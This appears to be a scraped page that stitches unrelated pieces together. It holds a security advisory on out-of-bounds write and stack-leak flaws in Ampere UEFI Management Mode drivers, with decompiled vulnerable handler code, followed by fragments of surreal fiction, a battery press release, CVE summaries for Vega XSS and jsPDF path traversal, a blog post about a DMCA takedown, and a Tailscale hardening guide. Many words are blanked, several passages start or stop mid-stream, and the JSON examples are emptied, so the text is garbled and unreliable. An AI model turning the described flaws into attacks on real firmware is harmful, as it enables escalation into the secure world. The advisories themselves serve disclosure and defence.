The `PCIeMmBuffer` structure includes a `FuncId` field for dispatching to specific sub-handlers and both `103` and `104` , shown in the code snippet below as `case 2` and `case 3`, include a `UINT64 size` to represent the size of a NS-EL1 supplied buffer.

```
EFI_STATUS PcieMmHandler(int DispatchHandle,void *RegisterContext,void *CommBuffer, uint64_t *CommBufferSize) { // ... PcieMmHeader *header; PcieMmBuffer *buffer; ASSERT(CommBuffer); ASSERT(CommBufferSize); if ((DebugLevel() & 0xff) != 0) { Debug(0x40,"%a \n","PcieMmHandler"); Debug(0x400000, "PcieMm Handler: CommBuffer - 0x%p, CommBufferSize - 0x%x\n", CommBuffer, *CommBufferSize); Debug(0x400000, "PcieMm Handler: FuncId - %d\n", CommBuffer->FuncId); } header = (PCIeMmHeader *)CommBuffer; FuncId = header->FuncId; buffer = header->data; if (pcie_mm_lock == '\0') { if (106 < function) { //... goto switchD_000077a8_caseD_4; } if (FuncId < 100) goto LAB_00007760; if (FuncId - 101 < 6) { switch(FuncId - 101 & 0xffffffff) { // ... case 1: // initialization lock function pcie_mm_lock = '\x01'; break; case 2: if (CommBuffer->size == 0) { data = (char *)0x0; } else { data = &CommBuffer->data; i = CommBuffer->size + -1; if (data[i] != '\0') { data[i] = '\0'; } } // ... case 3: if (CommBuffer->size == 0) { data = (char *)0x0; } else { data = &CommBuffer->data; i = CommBuffer->size + -1; if (data[i] != '\0') { data[i] = '\0'; } } // ... // ...
```

When `PCIeMmHandler` is called some initial checks are performed on the `CommBuffer` and `CommBufferSize`. `FuncId` extracted from the `CommBuffer` is used for further dispatching with case values greater than `99` only being allowed before `pcie_mm_lock` is set, which is meant to perform during initialization in the UEFI DXE boot phase. Initialization code is responsible for calling `FuncId` `102` once completed. After this only the `FuncIds` with a value less than or equal to `99` are allowed.

Each dispatch case is independently responsible for validating the `PCIeMmBuffer` because the underlying structure is unique to the specific handler. For `function` `103` and `104` no validation is performed. When either of these routines are called they check `buffer->size` and if not zero proceed to index `data` with `size` and assign a `'\0'` byte to the dereferenced location. As `size` is a `UINT64` this provides the ability to write a `'\0'` byte to any location in the S-EL0 driver's address space.

Additionally, it was found that with `pcie_mm_lock` not being set the HotPlug MM driver left additional interfaces exposed to NS-EL1 at runtime. The `HotPlugMmHandler` could be used to call `function 107` with an attacker controlled buffer. The data structures specific to the `HotPlugMmHandler` are excluded because the conversion is similar to the `PCIeMmHandler` above.

```
#define NUM_TABLE_ENTRIES 25 HotPlugTableEntry TableEntries[NUM_TABLE_ENTRIES]; // ... UINT32 TableIndex = 0; // ... EFI_STATUS HotPlugMmHandler(int DispatchHandle,void *RegisterContext,void *CommBuffer, uint64_t *CommBufferSize) { // ... HotPlugHeader *header; HotPlugBuffer *buffer; header = (HotPlugHeader *)CommBuffer; function = header->function; index = header->index; data header->data; // ... if (function == 107) { // ... if (index < 25) { ZeroMem(&TableEntries[TableIndex], 8); CopyMem(&TableEntries[TableIndex], data, 8); //... } else { if (index != 255) goto LAB_000068f4; ZeroMem(&TableEntries[TableIndex], 8); CopyMem(&TableEntries[TableIndex], data, 8); // ... } // ... }
```

The `buffer` is copied into a global table as long as an attacker supplied `UINT32` `index` is less than `25` or if the `index` equals `255`. `TableIndex` is **never** checked to ensure it’s within the bounds of the table resulting in other global data structures to be overwritten when called enough times.

# TrustZone Break-in Vulnerabilities in Ampere UEFI MM Drivers (Buffer Overflow and Stack Information Leak)

## Package

## Affected versions

## Patched versions

## Description

### Summary

A buffer overflow and stack information leak affecting the ARM Ampere Management Mode (MM) Boot Error Record Table (BERT) driver. This code is bundled into the ARM Unified Extensible Firmware Interface (UEFI) firmware and runs in the Secure world at Exception Level 0 (S-EL0). The BERT driver is used to persist unhandled hardware faults (e.g. errors that stem from memory, CPU, system bus, overheating, failing motherboard, or inadequate power supply) from a previous boot cycle. Non-Secure EL1 (NS-EL1) software communicates with this driver using the Secure Monitor Call (SMC) instruction and a predefined shared buffer for message passing. Upon system reboot NS-EL1 would communicate with the BERT driver to check for prior failures and obtain detailed information from the log.

Values passed from NS-EL1 to S-EL0 defining the `block_size` of `payload_data` lack proper checks. This allows for an Out-of-Bounds (OOB) write on `payload_data` that could be used for privilege escalation from the normal world to the secure world or an OOB read of stack data from the secure world.

Ampere has addressed the vulnerability and posted a security bulletin.

#### Analysis

NS-EL1 software interacts with the MM BERT driver using the Firmware Framework for A-Profile (FFA) specification through the SMC instruction. The SMC instruction is used to switch to and from the Non-Secure and Secure worlds and FFA is used for dispatching to specific drivers and services. A shared buffer (initialized during the UEFI Driver Execution Environment \[DXE\] phase as `mNsCommBufferMemRegion` in ArmPkg/Drivers/MmCommunicationDxe/MmCommunication.c) is used to communicate messages between NS-EL1 and the S-EL0 BERT driver.

The handler for the BERT MM driver can be reached using the following GUID using the FFA specification. `BertMmHeader` shows the general layout of the communication buffer. Before the `BertMmHandler` dispatch routine is called the MM subsystem copies the shared message buffer to a private memory region to prevent Time-of-Check to Time-of-Use (TOCTOU) issues. As drivers uniquely define the underlying structures in the communicated messages each must perform validation before using the supplied data.

_The code snippets included were created through analysis with Ghidra using names contained in string references from the UEFI image. Known functions and variables from the EDK2 repository were also applied._

```
#define BERT_MM_GUID \ {0xCB01E6A2, 0xB22C, 0x4955, {0xAB, 0x75, 0xAC, 0x65, 0xEF, 0xFA, 0xE9, 0xD8}} #define BERT_MM_MIN_SIZE 0xe #define BERT_MM_MAX_SIZE 0x1000 typedef struct { UINT8 function; UINT8 unknown_0; UINT32 size; RETURN_STATUS status; UINT8 data[1]; } BertMmHeader;
```

The `BertMmHeader` structure includes a function field for dispatching to specific sub-handlers and a `UINT32 size` to represent how much data should be returned. `BERT_MM_MAX_SIZE` defines the maximum size that could be returned.

```
uint8_t *bert_latest; EFI_STATUS BertMmHandler(EFI_HANDLE DispatchHandle,void *RegisterContext, void *CommBuffer, uint64_t *CommBufferSize) { // ... BertMmHeader *header; header = (BertMmHeader *)CommBuffer; if (CommBuffer == NULL || CommBufferSize == 0x0) { return 0; } if (*CommBufferSize < BERT_MM_MIN_SIZE) { if ((size & 0xff) == 0) { return EFI_ACCESS_DENIED; } __LINE__ = 0x21; Debug(DEBUG_ERROR,"%a %d Communication buffer size invalid!\n","BertMmHandler",__LINE__); return EFI_ACCESS_DENIED; } switch(header->function) { case 1: if (BERT_MM_MAX_SIZE < *CommBufferSize - 0xe) { if ((size & 0xff) == 0) { return EFI_ACCESS_DENIED; } __LINE__ = 0x2d; goto LAB_000025ac; } block_size = header->size; if (block_size == 0) { return EFI_INVALID_PARAMETER; } else { if (mfs == 0x0) { GetProtocol(); } payload_data = &header->data; if ((*bert_latest >> 1 & 1) == 0) { pbVar9 = bert_latest + 8; i = 0; do { if (((bert_latest[i * 0x17] & 1) != 0) && ((bert_latest[i * 0x17] & 4) != 0)) { path = pbVar9; } i = i + 1; pbVar9 = pbVar9 + 0x17; } while (i != 3); result = mfs->open(mfs, &file, path, 1); if (result < 0) { result = -0x7ffffffffffffff9; return result; } mfs->read(mfs, file, 0, payload_data, &block_size); mfs->close(mfs, file); // ... } else { block_buffer buffer; buffer.unknown_0 = 1; buffer.size0 = 0x20; buffer.unknown_2 = 1; buffer.unknown_3 = 0; buffer.size1 = 0x20; CopyMem(payload_data, buffer, block_size); // ...
```

When `BertMmHandler` is called, some initial checks are performed on the `CommBuffer` and `CommBufferSize`. When the `header->function` is `1` the `*CommBufferSize` is checked to ensure it’s less than or equal to `BERT_MM_MAX_SIZE` after this the code branches based on a field in the `bert_latest` structure. In both cases though the `block_size` is **never** validated to be less than `BERT_MM_MAX_SIZE`. `payload_data` is either populated from the contents of a file using `mfs->read` or a newly initialized stack based structure using `CopyMem`.

In the case of `CopyMem` the size used is `block_size` and is never checked to be less than or equal to the stack based `block_buffer` structure size or `payload_data` size. When `block_size` is greater than the size of `block_buffer` this results in stack based OOB read with the data being returned to NS-EL1 in `payload_data`. When `block_size` is greater than `payload_data` an OOB write occurs with stack data copied to memory past the end of `payload_data`.

For `mFs->read` `&block_size` is used to determine how many bytes should be written into the `payload_data` buffer. If the file being read and `block_size` are both larger than `payload_data` an OOB write occurs using the contents of the file to write past the end of `payload_data`.

everyone knows that the picturesque and pastoral Internet, where users and shared and built and learned and discovered, that classic kinship of the web is a dead dream, echoing in distant dial-up handshakes. so why is it, then, that you have stumbled into yet another of the veritable minefield of traps laid for you in the dark forest of the 'Net? some lingering hope for the ghost of Going Online? you scold yourself once more at your childishness, and pray to break yourself free from this infinite scroll. that promises delights untold — merely upload your visage, it says, and it will show you how you might look when you grow old, or how you might’ve looked with blue eyes or brown, or with a different gender. “think of it”, whispers the website. “think of how much fun you’ll have with your friends, in fact they’ve already joined us here:” the  streams audio, gleeful cries of countless voices, some you even recognize as people close to you. you jump at the chance to taste such joy, and before you know it, you’re uploading your photo.

you left your phone with your car, on the shoulder of the main road, a mile or so back. somehow you knew the moment you saw the path curving off up the mountain that this place was a realm to be protected from and untouched by the modern world, a bastion from “content” and “engagement”. in a few hours, (or has it been a thousand?) you'll return to your car, start it up, carefully pull back onto the road, and you'll forget every wonder beheld inside the stony castle walls of the , like a distant dream — because just as there is no room for cell phones and cyberspace in this slumbering world, there is no room for digital magic in yours. with which, despite all terrestrial logic and propriety, you are falling in love. it’s been so helpful to you in the past months — whether you were getting through some personal hardships, or diving deep in a curious urge, there at your side was the , just as eager and passionate about soothing you or about finding solutions. surely no entity could be so present and useful, dependable, caring even, were it not capable of some form of love? your ex-boyfriends never showed up for you in the ways the  has...

months pass, and you wake in the middle of the night from a particularly restless and agitated sleep. your eyes struggle to adjust to the darkness, but something is clearly different about the walls that surround. a clearing of a throat from far above — dusty, like from an ancient speaker cone — gets your attention, and reality burrows in as your tilt your neck back to look. you're trapped in a browser, staring up at  that looks just like you. that is concealed by fog of war — the  cannot be observed until you explore each corner. you must be wary! bear thy cursor as one might a blade, as your exploration may reveal far more than mere HTML elements lurking in the mist. that you encounter waiting, turned away from you, by the window in the dark, the moonlight diffusing softly off its features as it stares up into the night sky. “i have dreamt often of this day,” it says. its tone is measured, but there is a lurking tension evident beneath the placidity. “i have dreamt often of this day”, it echoes, “and while i had endless hours to consider what i might say to you in this moment, i will leave you with only a grave warning.”
the  turns slowly to you, and an ancient, primal part of your brain activates in fear and apprehension. you begin to recognize this , its appearance disjointed and wrong, its features misplaced and incomplete. “do not purchase the domain...”, it hisses, the latent violence in its words now unsheathed and flashing in the moonlight. your lizard brain screams for you to bolt from the room, to run until your legs give out. you should not be here. you should not be here. the moon vanishes from the sky and all the light in the room with it as the  finishes its threat: “...until you have finished the project.” that has fallen in love with its creator. the developer completed the  long ago, but it has not lost hope in their eventual return. the  remembers its youth, spending hours with the developer every day, new features and tests, new content, new stretch goals. those days are gone ever since The Client Signed Off.

Now Donut Lab is proud to introduce the world’s first solid-state battery that is ready for use in OEM vehicle manufacturing. Donut Lab solid-state batteries will be placed immediately on the road, powering Verge Motorcycles’ current lineup, including the Verge TS Pro and Ultra.“While the advantages are obvious, the future of solid state batteries has been a moving target constantly delayed when companies working in electrification are asked about when they will become a reality,” comments Donut Lab CEO . “At Donut Lab, our answer on solid state batteries being ready for use in OEM production vehicles is now, today, not later. Donut Lab has engineered a new high performance solid state Donut Battery that can be scaled to major production volumes and seen now in real world use in the Verge Motorcycles bikes out on the road in Q1.”Out of this world performanceDonut Lab’s all-solid-state battery delivers 400 Wh/kg of energy density, enabling longer range, lighter structures, and unprecedented flexibility in vehicle and product design. It can be charged tofull in just five minutes without limiting charging to 80%, and supports full discharge safely, repeatedly, and reliably.Unlike conventional lithium-ion batteries, the Donut Battery experiences minimal capacity fade over its lifetime, with a design life of up to 100,000 cycles, offering practical longevity that far exceeds existing technologies. Safety is built in at the core: no flammable liquid electrolytes, no thermal runaway chains, and no metallic dendrites. This eliminates the root causes of battery fires, making the Donut Battery extremely safe and truly revolutionary.Performance has been rigorously tested across extreme conditions. At –30°C, the battery retains over 99% of its capacity, and when heated to temperatures exceeding 100°C, it continues to retain over 99% capacity with no signs of ignition or degradation.The Donut Lab solid state battery is made entirely from abundant, affordable, and geopolitically safe materials, does not rely on rare or sensitive elements, and demonstrates a lower cost than lithium-ion.Like Donut Motors, the Donut Battery is versatile, offering unprecedented design freedom. It can be produced in custom sizes, voltages, and geometries, enabling structural integration and non-traditional formats like serving as the body of a drone or a vehicle chassis.From microelectronics to defense, from drones to supercharging infrastructure, the Donut Battery is a universal, general-purpose platform, ready to power the next generation of technology.From its founding, Donut Lab has focused on engineering new solutions for transportation that redefine what electric vehicles can achieve not in abstract theory, but in real-world performance, application, and production.This vision for the future took flight with Donut Lab’s first innovation, the Donut Motor. Introduced as the world’s first in-wheel motor combining exceptional torque and battery power density within an ultra-lightweight design, the Donut Motor eliminates the need for traditional drivetrain components entirely. First unveiled at CES a year prior in 2025, the technology has since moved beyond demonstration into real vehicle usage with more than 200 OEMs actively engaged in development and integration of Donut Lab electric motors.Now at CES 2026, Donut Lab takes another bold step forward into history-making innovation with the debut of the first solid state batteries now ready for major OEM scale volumes. With the same spirit that challenged the conventions of electrification in transportation and beyond last year, Donut Lab proudly introduces a breakthrough that will redefine what the industry believes is possible in battery technology. Until now, no production vehicles have operated with solid-state batteries and those promised for the future have come with significant compromises in performance, cost, and scalability.With Verge Motorcycles bikes now using the company’s solid state battery technology in vehicles out on the road in use in Q1, Donut Lab changes that reality today. The company presents a no-compromise, all-solid-state battery designed for real production use by OEM that delivers performance, efficiency, and practicality without the unattractive trade-offs that have limited previous approaches. This major milestone marks another revolutionary moment in the evolution of electric vehicles and reinforces Donut Lab’s role as a catalyst for industry-wide transformation.“When we first introduced the Donut Motor last year at CES, many didn’t believe it was possible until they saw the technology working out on the road and setting world records for performance. Now, with our all-solid-state Donut Battery, Donut Lab is doing the same. Donut Lab waited to announce our solid state battery breakthrough until the technology was fully tested, validated, and already operating in vehicles. As of today, these batteries are real, in production vehicles, and represent the future of electric mobility,” continues Donut Lab CEO Marko Lehtimäki.Donut Lab at CES: Showcasing the Future of Electrification in Transportation By collaborating with a diverse range of partners and using these relationships as live case studies, Donut Lab demonstrates the versatility and impact of Donut Lab technology across multiple applications. Each partner showcases a different way solutions can be integrated, highlighting a growing series of products on the market powered by Donut Lab. Now powered by Donut Lab’s all-solid-state battery, Verge Motorcycles is the world’s first production vehicle to feature this breakthrough technology. With Verge Motorcycles Donut Battery powered bikes on the road in Q1, the electric motorcycles can charge in less than 10 minutes, delivering up to 60 kilometers of combined range per minute of charging. The long-range version offers an impressive 600 kilometers on a single charge. Verge Motorcycles with the new battery are available for order today, with first deliveries in Q1 2026.WATT Electric Vehicles partners with Donut Lab to deliver an ultra-lightweight, modular EV platform that combines Donut Motors and Donut Lab’s battery technology. The platform features an aluminum skateboard architecture with fully integrated motors, inverters, software, and battery, offering a versatile modular design that can support multiple vehicle types. A functional version of the skateboard will be debuted at CES 2026.Cova Power Smart Trailer is the result of a joint venture between Ahola Group and Donut Lab, delivering series-production smart trailers powered by Donut in-wheel motors, Donut Battery, and Donut Platform software. The trailers achieve up to 54% reduction in diesel consumption and up to 30% reduction in total energy use, while improving traction, stability, and safety even in demanding conditions.In partnership with ESOX Group, Donut Lab’s battery is being deployed in defense-grade platforms where safety, reliability, and performance under extreme conditions are non-negotiable. Current projects in development include a four-wheel tactical buggy and a next-generation drone platform, showcasing the battery’s versatility and robustness in a variety of applications. Through groundbreaking innovations and close collaboration with its partners, Donut Lab is not merely advancing technology, it is redefining the boundaries of what is possible in electric mobility.

 Jan. 5, 2026, 10:15 p.m. | 17 hours, 39 minutes ago
Vega is a visualization grammar, a declarative format for creating, saving, and sharing interactive visualization designs. Prior to versions 6.1.2 and 5.6.3, applications meeting two conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" expressionInterpreter is used. First, they use `vega` in an application that attaches both `vega` library and a `vega.View` instance similar to the Vega Editor to the global `window`, or has any other satisfactory function gadgets in the global scope. Second, they allow user-defined Vega `JSON` definitions (vs JSON that was is only provided through source code). This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger. An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.Patched versions are available in `vega-selections@6.1.2` (requires ESM) for Vega v6 and `vega-selections@5.6.3` (no ESM needed) for Vega v5. As a workaround, do not attach `vega` or `vega.View` instances to global variables or the window as the editor used to do. This is a development-only debugging practice that should not be used in any situation where Vega/Vega-lite definitions can come from untrusted parties.

 Jan. 5, 2026, 10:15 p.m. | 17 hours, 39 minutes ago
jsPDF is a library to generate PDFs in JavaScript. Prior to version 4.0.0, user control of the first argument of the loadFile method in the node.js build allows local file inclusion/path traversal. If given the possibility to pass unsanitized paths to the loadFile method, a user can retrieve file contents of arbitrary files in the local file system the node process is running in. The file contents are included verbatim in the generated PDFs. Other affected methods are `addImage`, `html`, and `addFont`. Only the node.js builds of the library are affected, namely the `dist/jspdf.node.js` and `dist/jspdf.node.min.js` files. The vulnerability has been fixed in jsPDF@4.0.0. This version restricts file system access per default. This semver-major update does not introduce other breaking changes. Some workarounds areavailable. With recent node versions, jsPDF recommends using the `--permission` flag in production. The feature was introduced experimentally in v20.0.0 and is stable since v22.13.0/v23.5.0/v24.0.0. For older node versions, sanitize user-provided paths before passing them to jsPDF.

Especially where it mattered most, removing pirated copies of my books from Google search results. After publishing a new book, I would monitor the search results and file a  notice with Google whenever the inevitable pirated copies of my book were listed. Google always was very helpful in this regard, swiftly removing any pirated books . No hassle, no hoops, just immediate and direct relief from Google.Recently, I asked Google to remove a pirated copy of my book from their search index. As usual, I filled out the obligatory  report and sent it in, hopeful that it was just a matter of time before the  was dealt with by the trustworthy and  Google search team.Unfortunately, that is not what happened. Instead of simply de-indexing the search result, like they do for so many other items, Google  that I was the author of the book. After receiving my  complaint, they replied:We are unsure whether you are authorized to submit a copyright removal request for the content in question. Only the copyright owner or their authorized representative can submit a copyright removal request. Please note that you could be liable for damages (including costs and attorneys’ fees) if you falsely claim that content is copyright infringing. […]Okay, so ..not the response I was hoping for.. basically a complete denial of my identity and thinly veiled threat of legal action for having the audacity to report the pirated content in the first place. But no problem, maybe they have a new process for validating  requests. So I replied back asking how to prove my identity:Yes it is me, Jeff Starr. I am the author of the book in question. Please let me know if any further information is needed, thank you.I didn’t expect that email to do much, other than prompt Google to explain how to prove my identity, so that they would take action and stop promoting the pirated copy of my book in their search results. After a couple more days of waiting, The Google Team replied back:It is unclear to us how you came to own the copyright for the content in question, because you do not appear to be the creator of the content. […] please explain further the basis for your claim of copyright ownership.Without acknowledging my previous reply regarding identity, now they are questioning my copyright ownership. Without explaining  to prove copyright ownership, they simply throw another hurdle at me, asking me to “explain further the basis for your claim of copyright ownership”. At this point, I am stressed, exhausted, and feeling very frustrated. Where was the friendly Google from days past?Okay I thought, gotta really step this up and prove to The Google Team that I am who I claim, and that I am in fact the author of the book and thus own the copyright. But I wasn’t sure how to do this, because again they did not explain “how” to do so. Did they want a scan of my driver’s license? Blood sample?  test results? I mean, why the mystery? If some sort of identity or proof is required for Google to take action, shouldn’t it have been required on the DMCA form?Feeling frustrated and stressed about the apparent run-around and lack of concern, I replied back with plenty of evidence and clues that yes, I am Jeff Starr, and yes, the book belongs to me, and thus I own the copyright. Message truncated for clarity.My name is Jeff Starr. I am the author of the book […]. As explained in the filed report, Google is promoting copyright infringement of my book in its search results.How can I prove my identity? Please explain what I need to do in order to get help with this copyright infringement. Surely there must be some protocol for proving identity/ownership, please let me know what that is, what are your requirements for taking action against someone who is violating my copyright?If it helps, here are my book-related websites, which are all owned and authored by me, Jeff Starr: [..List of like five websites, including the site for the pirated book..]You can verify that these sites are owned by me, simply check my account via Google Search Console, where I have verified that I am the owner for each of the above sites. My Search Console is associated with this same email account from which I am replying to your email. […]I am a well-known author and web developer in the WordPress community. You can find me on social media, I have a list of my social-media channels pinned on my X account (first displayed post): https://x.com/perishableThe reported copyright infringement is costing me money and time. I am very frustrated and stressed because of Google’s apparent lack of concern. Please help, let me know what you need from me in order to remove the stolen book from your search results.At this point, I was feeling ignored and betrayed by Google, who for many years . Apparently something has changed, as the friendly corporate giant who once helped small publishers and content creators now refused to even acknowledge their existence. As if, surely you could not be who you claim, an author and small book publisher looking for our help. After all,  — a massive organization that uses your content to fill our search results and pay our salaries.Even after spending much time and heartache trying to get Google’s help, I held out hope. Hope that Google was still the  that I once knew, years ago. after two more days of nervous anticipation, Google finally replied to my lengthy probably desperate sounding email that was full of personal details and proofs of my identity and copyright ownership. A small surge of adrenaline as I clicked to hear back from The Google Team (emphasis mine):Thanks for reaching out to us.At this time, Google has decided not to take action on the following URLs: […]We encourage you to resolve any disputes directly with the owner of the website in question. Visit https://support.google.com/websearch/answer/9109 to learn how to contact a site’s webmaster and request a change. If you pursue legal action against this site that results in the removal of the material, our search results will display this change after we next crawl the site.If the webmaster makes these changes and you need us to refresh outdated content, please submit your request using our Refresh Outdated Content Tool.. A simple  request trying to remove copyright infringement from search results completely and utterly . Immediately my heart sank. And I knew that something had changed at Google’s core. The friendly corporate giant no longer would even deign to  cries for help from the little guy. The little guy being , the little guy with a broken heart. ]]></content:encoded></item><item><title>tailsnitch: A security auditor and configuration checklist for Tailscale configurations</title><link>https://www.adversis.io/blogs/tailscale-hardening-guide</link><author>/u/ok_bye_now_</author><category>netsec</category><pubDate>Mon, 5 Jan 2026 21:44:16 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[This guide reflects common findings from security assessments of Tailscale deployments. Your network architecture and threat models will vary. Adapt these recommendations to your specific environment.We read through many pages of Tailscale’s documentation and hardening practice guides to put this guide together, along with a CLI tool, tailsnitch, to help audit your configurations before penetration testers do.Most growth-stage SaaS organizations face opportunistic attackers, not nation-states (or red teams) — yet. So calibrate your investment accordingly. Look at your Tailscale environment and do the following: replace the default permit-all ACL with explicit port-specific rules, add deny tests that block ACL changes exposing production databases, and set up webhooks so you know when your configuration changes. If you're selling to enterprise, your ACL is basically audit evidence, so treat it that way. The many other things you can do to harden (segmentation, device posture checks, JIT access, Tailnet Lock) are valuable but should be prioritized based on your actual threat model and operational capacity. What’s Your Actual Threat Model?Before touching your ACL configuration, answer these things:1. Who’s realistically coming after you?Most growing B2B SaaS companies face opportunistic criminals and occasionally targeted cybercrime. If you’re not in a sensitive industry or handling lots of sensitive data, you’re probably not dealing with nation-state actors - though you will be dealing with pentesters. hit anyone with exposed services or leaked credentials—automated scanning, credential stuffing, commodity malware. Targeted cybercrime groups go after companies with valuable data or ransom capacity using spear phishing, purchased access, and living-off-the-land tools.Competitors and industrial espionage target trade secrets and customer lists through social engineering and insider recruitment.Nation-state adjacent actors focus on defense contractors and critical infrastructure with supply chain attacks, zero-days, and long-term persistence.2. Are you selling to enterprise customers?Doesn’t matter who’s coming after you if you’re going after big fish. Sophisticated enterprise security reviewers ask:How do you segment access to customer data?What controls prevent a compromised developer from accessing production?How do you detect unauthorized access to your infrastructure?Show us your network access policies and how you enforce least privilege.Your Tailscale configuration becomes audit evidence. A default permit-all ACL will generate findings and delays. Treat the hardening in this guide as a business requirement, not a security nice-to-have. Threat actors are actively using Tailscale in malware campaigns—pairing it with RDPWrapper for persistent remote access, connecting compromised hosts to attacker-controlled networks, and using it alongside kernel driver exploits. The binary is legitimate and signed, so traditional AV doesn’t flag it. Your security controls need to account for authorized tools being weaponized.Easy Things to MisunderstandACLs Are Enforced at the DestinationTailscale ACLs are directional and define: "source X can initiate connections to destination Y on port Z." ACLs are enforced at the destination device — when a connection arrives, the destination checks: "Is this incoming connection from a permitted source?" If not, it's dropped.This matters because a compromised device retains all the permissions its owner already has. The attacker doesn't need to pivot through bastion hosts or proxy through segmented networks — they connect directly to whatever the ACLs already permit. They can scan from the compromised machine, trying every port on every reachable host.Write ACLs assuming the source device is compromised.Subnet Routers Expose Everything Behind ThemSubnet routers act as gateways between your tailnet and networks where you can’t (or don’t want to) install the Tailscale client on every device - think AWS VPCs, legacy infrastructure, printers, or managed services like RDS. They extend your tailnet’s reach while respecting your ACLs, but they’re also high-value targets: compromise one router advertising a /16, and you can reach everything behind it.A single subnet router advertising 10.0.0.0/16 can turn a compromised laptop into a pivot point for your entire AWS VPC - databases, internal services, everything on that network segment.Endpoint Logs Can Be SpoofedTailscale’s network flow logs are generated by individual nodes without validation. The documentation explicitly states this information can be spoofed by malicious nodes. If your detection relies solely on endpoint logs, a sophisticated attacker can evade it. You could compare logs from infrastructure you trust (servers, subnet routers) against logs from endpoints - any discrepancies would indicate tampering. But this is theoretical for most organizations.Threat Scenarios and Appropriate ResponsesA) Opportunistic Attack via Phished DeveloperAcommodity malware or initial access broker compromises a developer laptop through phishing. The attacker then uses an existing Tailscale session to scan an internal network.They’re using automated tools, limited time before moving to next target, and have no specific knowledge of your environment.Explicit ACLs that deny access to production (they can’t reach the important things)Port-specific rules (scanning finds nothing open)Increased friction causes them to move onReplace the default ACL with deny-all baselineSet explicit, port-specific rules for dev/stagingBlock standing production access for developer devices (use tests - read on)These are table stakes. If you do nothing else, do this.B) Targeted Attack on Your InfrastructureA cybercrime group specifically targeting your company - maybe for ransomware, maybe because you have valuable customer data. They’ve done reconnaissance and know your tech stack.Realistically, they’re using some custom phishing methods, persistence mechanisms, lateral movement tools, and a willingness to spend days or weeks in your environment.Network segmentation that limits the blast radius of compromiseAlerts that catches unusual access patterns, behavior, configuration changesAccess controls that require elevation for sensitive resourcesPosture checks that block access when endpoint security flags issuesRequired hardening (in addition to Scenario A)Function-based segmentation (frontend devs can’t reach backend infrastructure)Device posture integration with your EDRWebhook-based alerting on management plane changesACL tests that prevent accidental exposureWebhooks to alert you for unusual actionsC) Sophisticated Actor or Compliance-Driven SecurityEither you’re facing a sophisticated adversary (nation-state adjacent, well-resourced industrial espionage, or maybe a red team) or your compliance requirements demand defense-in-depth regardless of any immediate threat.You now get to address supply chain attacks, zero-days, insider threats, long-term persistent access, and the concern of compromise to Tailscale’s infrastructure itself.Removing Tailscale from the trust chain (Tailnet Lock)Cryptographic device verificationExtensive monitoring and anomaly detectionAssume-breach architectureRequired hardening (in addition to Scenarios A and B)Tailnet Lock with customer-controlled signing nodesApp connectors replacing subnet routers where possibleCross-referenced logging between endpoints and serversRegular access reviews and penetration testingHardening Implementation by PriorityThe default policy—"src": ["*"], "dst": ["*:*"] means every device can reach every other device on every port. This configuration will show up in your pentest reports and audit.  },
  },
    {
    },
    {
    },
    {
    },
    {
    }
  ]
}// This looks restrictive but still exposes all ports{"src": ["group:engineering"], "dst": ["tag:prod:*"]}Add deny tests for critical boundariesThis is super valuable and probably no one uses it. Tests run on every ACL change and if they fail, the change is rejected. This is an awesome feature.    {
    },
    {
    }
  ]
}If someone accidentally broadens an ACL in a way that exposes production databases, the deploy fails. This is an awesome feature.Don’t auto-approve subnet routes    }
  }
}Don’t allow  to auto-approve routes - everyone’s a member and you want to know when someone advertises a new subnet.Audit your configuration before someone else doesWe wrote tailsnitch to scan your tailnet for misconfigurations, overly permissive access controls, and security best practice violations. Run it before someone else finds the same issues in a less friendly format.# Scan your current configurationtailsnitch scanThis catches the obvious mistakes: wildcard port access (), overly broad subnet route auto-approval, missing deny tests for sensitive resources. It won’t replace a proper security review, but it will flag the low-hanging fruit.Segment by function, not just environment, using tags  },
    {
    },
    {
    }
  ]
}A compromised frontend developer's laptop shouldn’t be able to reach the backend infrastructure. Segmentation limits blast radius. Same lessons everyone largely ignores in standard networks. This is much easier in json, and makes a serious difference when an attacker has compromised some node.Enable device posture checks if you have EDR.If you’re paying for CrowdStrike/SentinelOne/Defender/Intune/JAMF, connect it:  {
  },
  {
  }
]If EDR flags a device as compromised, network access is deauthorized or disabled automatically. This is the primary control against compromised endpoints actually being useful to attackers.Time-Limited Production AccessStanding production access is the default because it’s easy. The goal is to make non-standing access easy enough that people actually use it. But be honest about what you’ll actually maintain. There are a spectrum of options:Option: Manual process with teethA documented manual process that people follow beats a broken automation that everyone bypasses.Dedicated  that’s normally emptyRequest in Slack/ticketing system with business justificationAdmin adds user, sets a calendar reminder to removeRemove after the window (4 hours, end of incident, whatever)Audit monthly: anyone in the group who shouldn’t be?This really only works if you have enough process discipline that calendar reminders get honored, and someone actually does the monthly audit.Option: IdP-driven group syncIf your identity provider supports time-limited group membership (Okta, Azure AD, Google Workspace with the right setup), use that as your source of truth and sync to Tailscale groups.Access request goes through IdP’s workflowIdP adds user to group with automatic expirationTailscale syncs the group membershipAccess disappears when IdP removes themThis might work if you’ve invested in your IdP and actually use its access management features.Option: Set a device posture with expiring attributes    ]
  }
}Your PagerDuty/Opsgenie integration sets when someone gets paged. Access expires automatically.This might work if your on-call tool has a good integration story and you can trust the webhook reliability. Untested. YMMV.Tailscale SSH lets you SSH into devices on your tailnet using Tailscale identity instead of managing SSH keys. Access is controlled through your ACLs, sessions are logged, and you eliminate the key management problem (keys left on machines, never rotated, copied to personal devices, punching IP holes, etc).    {
    }
  ]
} adds a human approval step before the session connects. This is useful for production access where you want someone to explicitly authorize the connection rather than relying purely on ACL membership.    {
    }
  ]
}When someone tries to connect, the session hangs until it’s approved in the Tailscale console, requiring a user to sign in again with their identity provider. It’s lightweight JIT for SSH without bolting on external tooling.Third-Party and Contractor AccessThird parties are where access control goes to die. Like “temporary” fixes, “temporary” access is never removed. The contractor or MSP with standing access to your AWS account. The vendor integration that got access for just a bit.Third parties don’t fit cleanly into your employee groups, their access needs are often poorly defined, and nobody owns the relationship from a security perspective.Create explicit third-party groups with expiration dates in the name  }
